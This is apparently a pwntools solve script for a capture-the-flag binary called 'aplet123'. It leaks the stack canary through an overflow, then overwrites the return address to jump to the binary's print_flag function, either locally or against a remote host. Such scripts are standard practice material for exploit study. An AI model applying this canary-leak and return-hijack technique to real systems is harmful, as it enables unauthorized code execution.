from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./aplet123"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+82
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    #offset = 
    log.info("binary loaded")
    pp.recvline()
    pp.sendline(cyclic(69) + b"i'm")
    canary = pp.recvuntil(b"123").split()[1]
    intcanary = u64( b"\x00" + canary[0:7])
    log.info(f"canary {hex(intcanary)}")
    # sending the payload
    payload = flat(
        cyclic(72),
        intcanary,
        0, 
        elf.sym.print_flag
            )
    pp.sendline(payload)
    pp.recvline()
    pp.sendline(b"bye")
    pp.interactive()
    # fucking canary offset : 0x7ffd6a1b65d0
    # canary                : 0x52408bba84200500

if (args.REMOTE):
    # libc = ELF("./libc.so.6")
    libc = ELF("/usr/lib/libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
